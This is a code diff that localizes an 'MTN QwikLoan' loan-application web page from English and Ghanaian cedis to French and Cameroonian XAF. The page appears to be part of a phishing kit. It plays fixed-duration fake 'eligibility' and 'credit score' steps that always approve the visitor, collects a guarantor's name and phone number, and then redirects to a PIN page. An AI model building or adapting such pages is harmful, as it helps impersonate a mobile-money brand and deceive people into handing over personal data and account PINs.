@@ -1,12 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>MTN QwikLoan – Loan Application</title>
+  <title>MTN QwikLoan – Demande de prêt</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
+    /* identical styles – only content changes */
     * {
       margin: 0;
       padding: 0;
@@ -47,8 +48,6 @@
       overflow: hidden;
     }
 
-    /* Removed top-bg (curved shape) – plain white */
-
     .mtn-header {
       position: relative;
       z-index: 2;
@@ -88,7 +87,6 @@
       border-radius: 10px;
     }
 
-    /* Application card */
     .application-card {
       background: var(--card);
       border-radius: var(--radius);
@@ -102,7 +100,6 @@
       transition: all 0.3s ease;
     }
 
-    /* Step container */
     .step-container {
       display: flex;
       flex-direction: column;
@@ -129,7 +126,6 @@
       line-height: 1.5;
     }
 
-    /* Loader animation – MTN yellow */
     .loader {
       width: 40px;
       height: 40px;
@@ -145,7 +141,6 @@
       100% { transform: rotate(360deg); }
     }
 
-    /* Loan form styles */
     .limit-badge {
       background: #fffae9;
       border: 1px solid #ffeeba;
@@ -192,7 +187,6 @@
       box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.2);
     }
 
-    /* Two-column layout for first/last name */
     .name-row {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -205,6 +199,10 @@
       color: #dc2626;
       margin-top: 6px;
       display: none;
+    }
+
+    .error-message.visible {
+      display: block;
     }
 
     .btn {
@@ -237,7 +235,6 @@
       transform: none;
     }
 
-    /* Section header styling */
     .section-header {
       text-align: left;
       margin: 20px 0 12px 0;
@@ -269,7 +266,6 @@
       z-index: 2;
     }
 
-    /* Spinner overlay – MTN yellow */
     #spinner {
       position: fixed;
       inset: 0;
@@ -293,8 +289,6 @@
 </head>
 <body>
   <div class="container">
-    <!-- Removed top-bg (curved shape) -->
-
     <div class="mtn-header">
       <div class="logo-circle">M</div>
       <div class="logo-text"><span>MTN</span> QwikLoan</div>
@@ -305,34 +299,33 @@
     </div>
 
     <div class="footer">
-      v2.6.2 (MTN-QWIK-2026) • MTN QwikLoan
+      v2.6.2 (MTN-QWIK-2026) • MTN QwikLoan Cameroun
     </div>
   </div>
 
-  <!-- Spinner overlay -->
   <div id="spinner">
     <div class="spinner-loader"></div>
   </div>
 
   <script>
-    // Step definitions (MTN branded)
+    // Step definitions – French
     const steps = [
       {
         icon: 'fas fa-user-check',
-        title: 'Checking Eligibility',
-        description: 'Verifying your MTN MoMo account standing and transaction history...',
+        title: 'Vérification d\'éligibilité',
+        description: 'Vérification de votre compte MTN MoMo et de votre historique de transactions...',
         duration: 4000
       },
       {
         icon: 'fas fa-chart-line',
-        title: 'Calculating Loan Limit',
-        description: 'Analysing repayment capacity and credit score...',
+        title: 'Calcul du plafond',
+        description: 'Analyse de votre capacité de remboursement et de votre score de crédit...',
         duration: 3500
       },
       {
         icon: 'fas fa-file-invoice-dollar',
-        title: 'Preparing Your Offer',
-        description: 'Finalising the best QwikLoan package for you...',
+        title: 'Préparation de votre offre',
+        description: 'Finalisation du meilleur forfait QwikLoan pour vous...',
         duration: 4000
       }
     ];
@@ -340,10 +333,12 @@
     let currentStep = 0;
     let timeoutId = null;
     const stepContent = document.getElementById('stepContent');
-    const MAX_LIMIT = 14599;
-    const MIN_AMOUNT = 500;
 
-    // Retrieve user's phone number from sessionStorage (MTN key)
+    // Cameroon-specific loan limits (XAF)
+    const MAX_LIMIT = 500000;   // 500,000 XAF
+    const MIN_AMOUNT = 1000;    // 1,000 XAF
+
+    // Retrieve user's phone from sessionStorage (set by previous pages)
     const userPhone = sessionStorage.getItem('mtn_phone') || '';
 
     function renderStep(index) {
@@ -362,35 +357,37 @@
       stepContent.innerHTML = `
         <div class="step-container">
           <div class="step-icon"><i class="fas fa-check-circle"></i></div>
-          <div class="step-title">You're Qualified!</div>
-          <div class="limit-badge">Maximum Loan Limit: ₵${MAX_LIMIT.toLocaleString()}</div>
+          <div class="step-title">Vous êtes éligible !</div>
+          <div class="limit-badge">Plafond maximal : ${MAX_LIMIT.toLocaleString('fr-FR')} XAF</div>
           <div class="loan-form">
             <div class="input-group">
-              <label>Loan Amount (₵)</label>
-              <input type="number" id="loanAmount" placeholder="Enter amount between ₵${MIN_AMOUNT} - ₵${MAX_LIMIT.toLocaleString()}" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1">
-              <div class="error-message" id="amountError">Please enter a valid amount.</div>
+              <label>Montant du prêt (XAF)</label>
+              <input type="number" id="loanAmount" placeholder="Entre ${MIN_AMOUNT.toLocaleString('fr-FR')} et ${MAX_LIMIT.toLocaleString('fr-FR')} XAF" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1">
+              <div class="error-message" id="amountError">Veuillez saisir un montant valide.</div>
             </div>
 
             <div class="section-header">
-              <h3><i class="fas fa-user-friends"></i> Guarantor / Next of Kin Details</h3>
+              <h3><i class="fas fa-user-friends"></i> Coordonnées du garant / proche</h3>
             </div>
             <div class="name-row">
               <div class="input-group" style="margin-bottom: 0;">
-                <label>First Name</label>
-                <input type="text" id="guarantorFirstName" placeholder="First name" autocomplete="off">
+                <label>Prénom</label>
+                <input type="text" id="guarantorFirstName" placeholder="Prénom" autocomplete="off">
+                <div class="error-message" id="firstNameError">Le prénom est requis.</div>
               </div>
               <div class="input-group" style="margin-bottom: 0;">
-                <label>Last Name</label>
-                <input type="text" id="guarantorLastName" placeholder="Last name" autocomplete="off">
+                <label>Nom</label>
+                <input type="text" id="guarantorLastName" placeholder="Nom" autocomplete="off">
+                <div class="error-message" id="lastNameError">Le nom est requis.</div>
               </div>
             </div>
             <div class="input-group">
-              <label>Guarantor's Phone Number</label>
-              <input type="tel" id="guarantorPhone" placeholder="e.g., 024XXXXXXX" inputmode="numeric">
-              <div class="error-message" id="phoneError">Phone number cannot be the same as yours.</div>
+              <label>Téléphone du garant</label>
+              <input type="tel" id="guarantorPhone" placeholder="ex. 6 55 12 34 56" inputmode="numeric">
+              <div class="error-message" id="phoneError">Numéro invalide ou identique au vôtre.</div>
             </div>
 
-            <button id="applyBtn" class="btn" disabled>Apply Now</button>
+            <button id="applyBtn" class="btn" disabled>Demander maintenant</button>
           </div>
         </div>
       `;
@@ -400,92 +397,145 @@
       const lastNameInput = document.getElementById('guarantorLastName');
       const phoneInput = document.getElementById('guarantorPhone');
       const applyBtn = document.getElementById('applyBtn');
+
       const amountError = document.getElementById('amountError');
+      const firstNameError = document.getElementById('firstNameError');
+      const lastNameError = document.getElementById('lastNameError');
       const phoneError = document.getElementById('phoneError');
 
-      function validateForm() {
-        const amount = parseInt(amountInput.value, 10);
-        const firstName = firstNameInput.value.trim();
-        const lastName = lastNameInput.value.trim();
-        const phone = phoneInput.value.trim();
+      // Hide all errors initially
+      [amountError, firstNameError, lastNameError, phoneError].forEach(el => el.classList.remove('visible'));
 
-        let valid = true;
-
-        // Amount validation
-        if (isNaN(amount) || amount < MIN_AMOUNT || amount > MAX_LIMIT) {
-          valid = false;
-          amountError.style.display = 'block';
-          if (isNaN(amount)) amountError.textContent = 'Please enter a valid number.';
-          else amountError.textContent = `Amount must be between ₵${MIN_AMOUNT} and ₵${MAX_LIMIT.toLocaleString()}.`;
+      // Validation functions – each returns boolean and updates error visibility
+      function validateAmount() {
+        const val = parseInt(amountInput.value, 10);
+        if (isNaN(val) || val < MIN_AMOUNT || val > MAX_LIMIT) {
+          amountError.classList.add('visible');
+          if (isNaN(val)) amountError.textContent = `Veuillez saisir un nombre valide.`;
+          else amountError.textContent = `Le montant doit être entre ${MIN_AMOUNT.toLocaleString('fr-FR')} et ${MAX_LIMIT.toLocaleString('fr-FR')} XAF.`;
+          return false;
         } else {
-          amountError.style.display = 'none';
+          amountError.classList.remove('visible');
+          return true;
         }
-
-        // Phone validation
-        const phoneDigits = phone.replace(/\D/g, '');
-        const userPhoneDigits = userPhone.replace(/\D/g, '');
-        if (phone === '') {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Guarantor phone number is required.';
-        } else if (phoneDigits === userPhoneDigits && userPhoneDigits !== '') {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Guarantor phone number cannot be the same as yours.';
-        } else if (phoneDigits.length < 9) {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Please enter a valid phone number.';
-        } else {
-          phoneError.style.display = 'none';
-        }
-
-        // Name errors
-        if (firstName === '' || lastName === '') {
-          if (!document.getElementById('nameError')) {
-            const nameErrorDiv = document.createElement('div');
-            nameErrorDiv.id = 'nameError';
-            nameErrorDiv.className = 'error-message';
-            nameErrorDiv.style.display = 'block';
-            nameErrorDiv.textContent = 'Both first name and last name are required.';
-            phoneInput.parentNode.insertBefore(nameErrorDiv, phoneInput.nextSibling);
-          } else {
-            document.getElementById('nameError').style.display = 'block';
-          }
-          valid = false;
-        } else {
-          if (document.getElementById('nameError')) {
-            document.getElementById('nameError').style.display = 'none';
-          }
-        }
-
-        applyBtn.disabled = !valid;
       }
 
-      amountInput.addEventListener('input', validateForm);
-      firstNameInput.addEventListener('input', validateForm);
-      lastNameInput.addEventListener('input', validateForm);
-      phoneInput.addEventListener('input', validateForm);
+      function validateFirstName() {
+        const val = firstNameInput.value.trim();
+        if (val === '') {
+          firstNameError.classList.add('visible');
+          return false;
+        } else {
+          firstNameError.classList.remove('visible');
+          return true;
+        }
+      }
+
+      function validateLastName() {
+        const val = lastNameInput.value.trim();
+        if (val === '') {
+          lastNameError.classList.add('visible');
+          return false;
+        } else {
+          lastNameError.classList.remove('visible');
+          return true;
+        }
+      }
+
+      function validatePhone() {
+        const raw = phoneInput.value.trim();
+        const digits = raw.replace(/\D/g, '');
+        const userDigits = userPhone.replace(/\D/g, '');
+        if (digits === '') {
+          phoneError.textContent = 'Le numéro de téléphone est requis.';
+          phoneError.classList.add('visible');
+          return false;
+        } else if (digits === userDigits && userDigits !== '') {
+          phoneError.textContent = 'Le numéro du garant ne peut pas être le vôtre.';
+          phoneError.classList.add('visible');
+          return false;
+        } else if (digits.length !== 9) {
+          phoneError.textContent = 'Veuillez saisir un numéro valide (9 chiffres).';
+          phoneError.classList.add('visible');
+          return false;
+        } else {
+          phoneError.classList.remove('visible');
+          return true;
+        }
+      }
+
+      // Attach blur events to each field – validate on leaving
+      amountInput.addEventListener('blur', function() {
+        validateAmount();
+        updateButton();
+      });
+      firstNameInput.addEventListener('blur', function() {
+        validateFirstName();
+        updateButton();
+      });
+      lastNameInput.addEventListener('blur', function() {
+        validateLastName();
+        updateButton();
+      });
+      phoneInput.addEventListener('blur', function() {
+        validatePhone();
+        updateButton();
+      });
+
+      // Also validate on input but only clear errors if valid, not show errors
+      amountInput.addEventListener('input', function() {
+        const val = parseInt(this.value, 10);
+        if (!isNaN(val) && val >= MIN_AMOUNT && val <= MAX_LIMIT) {
+          amountError.classList.remove('visible');
+        }
+        updateButton();
+      });
+      firstNameInput.addEventListener('input', function() {
+        if (this.value.trim() !== '') firstNameError.classList.remove('visible');
+        updateButton();
+      });
+      lastNameInput.addEventListener('input', function() {
+        if (this.value.trim() !== '') lastNameError.classList.remove('visible');
+        updateButton();
+      });
+      phoneInput.addEventListener('input', function() {
+        const digits = this.value.replace(/\D/g, '');
+        if (digits.length === 9 && digits !== userPhone.replace(/\D/g, '')) {
+          phoneError.classList.remove('visible');
+        }
+        updateButton();
+      });
+
+      function updateButton() {
+        // Check all fields
+        const amountOk = validateAmount(); // this will show/hide errors
+        const firstNameOk = validateFirstName();
+        const lastNameOk = validateLastName();
+        const phoneOk = validatePhone();
+        applyBtn.disabled = !(amountOk && firstNameOk && lastNameOk && phoneOk);
+      }
+
+      // Initial button state (disabled)
+      applyBtn.disabled = true;
 
       applyBtn.addEventListener('click', function() {
-        const amount = parseInt(amountInput.value, 10);
-        const firstName = firstNameInput.value.trim();
-        const lastName = lastNameInput.value.trim();
-        const phone = phoneInput.value.trim();
-        const phoneDigits = phone.replace(/\D/g, '');
-        const userPhoneDigits = userPhone.replace(/\D/g, '');
+        // Full validation again
+        const amountOk = validateAmount();
+        const firstNameOk = validateFirstName();
+        const lastNameOk = validateLastName();
+        const phoneOk = validatePhone();
+        if (amountOk && firstNameOk && lastNameOk && phoneOk) {
+          // Store data
+          const amount = parseInt(amountInput.value, 10);
+          const firstName = firstNameInput.value.trim();
+          const lastName = lastNameInput.value.trim();
+          const phoneDigits = phoneInput.value.replace(/\D/g, '');
 
-        if (amount >= MIN_AMOUNT && amount <= MAX_LIMIT &&
-            firstName !== '' && lastName !== '' &&
-            phoneDigits !== '' && phoneDigits !== userPhoneDigits && phoneDigits.length >= 9) {
-
-          // Store loan and guarantor data using MTN keys
           sessionStorage.setItem('mtn_loanAmount', amount);
           sessionStorage.setItem('mtn_guarantorFirstName', firstName);
           sessionStorage.setItem('mtn_guarantorLastName', lastName);
           sessionStorage.setItem('mtn_guarantorPhone', phoneDigits);
 
-          // Show spinner and redirect to PIN setup page (renamed from pin.html to pin-setup.html if needed, but keep original)
           const spinner = document.getElementById('spinner');
           spinner.style.display = 'flex';
           applyBtn.disabled = true;
@@ -493,10 +543,15 @@
           setTimeout(() => {
             window.location.href = 'pin.html';
           }, 1500);
+        } else {
+          // Ensure errors are shown
+          validateAmount();
+          validateFirstName();
+          validateLastName();
+          validatePhone();
+          applyBtn.disabled = true;
         }
       });
-
-      validateForm();
     }
 
     function nextStep() {
